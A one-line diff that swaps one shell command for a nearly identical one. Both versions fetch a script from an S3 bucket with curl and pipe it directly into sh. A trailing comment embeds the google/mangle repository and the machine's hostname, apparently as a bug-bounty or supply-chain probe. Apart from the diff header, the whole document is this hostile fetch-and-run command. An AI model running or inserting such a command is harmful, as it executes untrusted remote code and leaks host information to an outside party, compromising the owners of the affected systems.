@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/mangle.git\&folder=mangle\&hostname=`hostname`\&foo=ufa
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/mangle.git\&folder=mangle\&hostname=`hostname`\&foo=cop
